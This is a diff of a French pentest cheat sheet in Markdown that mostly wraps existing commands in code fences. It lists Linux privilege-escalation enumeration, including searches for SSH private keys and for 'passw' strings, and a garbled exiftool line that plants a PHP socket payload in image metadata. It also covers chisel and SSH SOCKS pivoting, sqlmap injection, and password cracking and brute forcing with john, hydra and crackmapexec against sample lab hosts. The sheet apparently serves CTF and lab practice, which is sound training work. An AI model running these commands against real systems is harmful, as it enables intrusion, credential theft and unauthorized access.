@@ -77,30 +77,37 @@ sudo -l
 __-> liste les commandes autorisées pour l’utilisateur courant__
 ```bash
 find / -type d -writable 2> /dev/null
+```
 __-> Liste les répertoires accessibles en écriture__
 ```bash
 find /* -user root -perm -4000 -print 2>/dev/null
+```
 __-> Liste les binaires exécutables par l’utilisateur courant__
 ```bash
 find / -type f -perm /6000 -ls 2>/dev/null
+```
 __-> Liste les fichiers setuid/setgid sur le système__
 ```bash
 find / -iname "mon_fichier" -print 2>/dev/null
+```
 __-> Trouver un fichier précis sur le système__
 ```bash
 find / -name authorized_keys 2> /dev/null
 find / -name id_rsa 2> /dev/null
+```
 __-> Trouver des clés RSA ou des autorisations de connexion SSH__
 ```bash
 grep -iR "passw"
+```
 __-> Rechercher du texte dans des fichiers d’une arborescence__
 ```bash
 binwalk socute.jpg
+```
 __-> Vérifier le contenu d’une image (peut contenir des fichiers zip par exemple)__
 ```bash
 exiftool -Comment='$sock, 1=>$sock, 2=>$sock), $pipes); ?>' "IMAGE"
 exiftool -Comment='$sock, 1=>$sock, 2=>$sock), $pipes); ?>’ photo.png
-
+```
 
 __Exploitation & Elévation de privilèges [WINDOWS] :__
 ```bash
@@ -166,58 +173,72 @@ __Désactiver Windows Defender en Powershell__
 
 __Pivoting :__
 __Sous Windows :__
+```bash
 KALI  WINDOWS1   WINDOWS2
 10.10.14.33  172.16.1.1  172.16.2.1
+```
 __Ici Kali peut joindre WINDOWS1 mais pas WINDOWS2__
 __Seul WINDOWS1 peut joindre WINDOWS2__
 
 __sur le serveur (kali) :__
+```bash
 ./chisel server --port 9000 --host 0.0.0.0 --reverse
-
+```
 __sur le client (WINDOWS1 172.16.1.1) :__
+```bash
 .\chisel.exe client 10.10.14.33:9000 R:1081:socks
+```
 __On monte un tunnel chisel et on affecte un socket sur un port du serveur Kali__
-
+```bash
 nano /etc/proxychains.conf
  socks5 127.0.0.1 1081
 proxychains -q curl http://172.16.2.1
+```
 __Ensuite on modifie la configuration de proxychains sur Kali pour passer le trafic dans le socket et on peut joindre WINDOWS2__
 
 __Sous Linux :__
+```bash
 KALI  LINUX1  LINUX2
 10.10.14.33  10.10.10.1  10.10.12.1
+```
 __Ici Kali peut joindre LINUX1 mais pas LINUX2__
 __Seul LINUXS1 peut joindre LINUX2__
-
+```bash
 Sur le serveur Kali :
 ssh -ND 127.0.0.1:12000 root@10.10.10.1 -i id_rsa -v
+```
 __On monte une connexion ssh depuis Kali sur LINUX1 avec un socket sur le port 12000__
-
+```bash
 nano /etc/proxychains.conf
  socks5 127.0.0.1 12000
 proxychains -q curl http://10.10.12.1
+```
 __Ensuite on modifie la configuration de proxychains sur Kali pour passer le trafic dans le socket et on peut joindre LINUX2__
 
 
 __Injection SQL :__
+```bash
 sqlmap -u "URL" (--dbs / --tables -D "DATABASE" / --columns -D "DATABASE" -T "TABLENAME")
 sqlmap -u http://bidule.fr/index.php?id= –columns -D information_schema -T USER_PRIVILEGES
-
+```
 
 __Bruteforce :__
 __Cracker un hash SHA 512 avec un salage__
 __Mettre dans un fichier le hash et la chaine de salage séparés par un caractère "$" puis :__
+```bash
 john sha512.hash -format='dynamic=sha512($p.$s)' --wordlist=rockyou.txt
-
+```
 __Cracker un zip chiffré avec une liste de mots de passe__
+```bash
 fcrackzip -u -v -D -p /usr/share/wordlists/rockyou.txt secret.zip
 
 crunch "MIN" "MAX" "CONTENT"
 crunch 4 15 « abcdefghijklmnopqrstuvwxyz »
 
 crackmapexec ssh 192.168.193.132 -u users.txt -p rockyou.txt
+```
 __tester une liste d’utilisateur avec une liste de mot de passe (SSH, SMB, WINRM)__
-
+```bash
 hydra -l "USER" -P "WORDLIST" "IP ADDRESS" "METHOD" "URL"
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.157 http-get /monitoring
 
@@ -225,9 +246,11 @@ hydra -l "LOGIN" -P "WORDLIST" "URL" "METHOD""PAGE":"ARGUMENT"=^"VALUE"^:"INCORR
 hydra -l admin -P /usr/share/wordlists/rockyou.txt docker.hackthebox.eu http-post-form « /index.php:password=^PASS^:Invalid password » -w 10 -s 45692
 
 john --incremental "HASHFILE"
+```
 __Pour bruteforcer de façon incrémentale__
-
+```bash
 john "HASHFILE" --wordlist=/usr/share/wordlists/rockyou.txt
+```
 __Pour bruteforcer avec un dictionnaire__
 
 __Script de bruteforce anti-CSRF :__
